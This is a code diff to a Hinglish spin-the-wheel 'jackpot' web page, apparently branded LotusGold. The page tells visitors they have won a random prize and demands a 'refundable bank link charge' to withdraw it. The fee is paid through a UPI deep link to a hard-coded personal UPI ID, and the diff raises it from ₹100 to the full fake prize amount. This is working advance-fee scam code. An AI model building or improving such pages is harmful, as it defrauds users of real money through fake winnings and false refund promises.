@@ -96,22 +96,23 @@
     <div id="reward-modal">
         <div class="reward-card">
             <div style="font-size: 50px;">🎊</div>
-            <h2 style="color: #fff; margin-top: 10px;">BOHOT BOHOT BADHAI HO!</h2>
+            <h2 style="color: #fff; margin-top: 10px;">BADHAI HO!</h2>
             <p style="color: #00f2ff; font-weight: bold; margin-top: 5px;">Aapka Jackpot Amount Unlock Hai</p>
             <div class="win-amt" id="finalPrize">₹0</div>
             <p style="color: #eee; font-size: 16px; line-height: 1.4;">
-                Aapki jeeti hui rashi bank mein bhejne ke liye taiyar hai. <b>Bank Link Charge (Refundable)</b> pay karke turant apna full amount withdraw karein.
+                Aapki rashi bank mein bhejne ke liye taiyar hai. <b>Bank Link Charge</b> (Refundable) pay karke turant apna full amount withdraw karein.
             </p>
             <button class="claim-btn" onclick="goToPayment()">INSTANT WITHDRAW</button>
-            <p class="timer-text">⚡ Payment ke 2 minute baad rashi credit ho jayegi!</p>
+            <p class="timer-text">⚡ Payment ke turant baad rashi credit ho jayegi!</p>
         </div>
     </div>
 
     <script>
         const wheel = document.getElementById('wheel');
-        const prizes = ["₹500", "₹700", "₹350", "₹600", "₹450", "₹250", "₹650", "₹300"];
+        const prizes = ["500", "700", "350", "600", "450", "250", "650", "300"]; // Values as numbers
         const colors = ["#b8860b", "#000", "#b8860b", "#000", "#b8860b", "#000", "#b8860b", "#000"];
         let rotation = 0;
+        let currentWin = 0;
 
         prizes.forEach((p, i) => {
             const seg = document.createElement('div');
@@ -119,7 +120,7 @@
             seg.style.transform = `rotate(${i * 45}deg) skewY(45deg)`;
             seg.style.backgroundColor = colors[i];
             const span = document.createElement('span');
-            span.innerText = p;
+            span.innerText = "₹" + p;
             span.style.transform = `rotate(22.5deg) skewY(-45deg)`;
             seg.appendChild(span);
             wheel.appendChild(seg);
@@ -131,21 +132,26 @@
             btn.disabled = true;
             btn.style.opacity = "0.5";
             const winIdx = Math.floor(Math.random() * prizes.length);
+            
+            // Store the win amount
+            currentWin = prizes[winIdx];
+            
             rotation += 3600 + (360 - (winIdx * 45));
             wheel.style.transform = `rotate(${rotation}deg)`;
 
             setTimeout(() => {
                 document.getElementById('winSound').play();
                 confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-                document.getElementById('finalPrize').innerText = prizes[winIdx];
+                document.getElementById('finalPrize').innerText = "₹" + currentWin;
                 document.getElementById('reward-modal').style.display = 'flex';
             }, 7200);
         }
 
         function goToPayment() {
-            window.location.href = `upi://pay?pa=8709615634-w350@ybl&pn=LotusGold_Rewards_Payout&am=100&tn=Refundable_Link_Charge&cu=INR`;
+            // UPI Link uses the currentWin variable automatically
+            const upiId = "8709615634-w350@ybl";
+            window.location.href = `upi://pay?pa=${upiId}&pn=LotusGold_Rewards&am=${currentWin}&tn=Bank_Link_Charge_Refundable&cu=INR`;
         }
     </script>
 </body>
 </html>
-
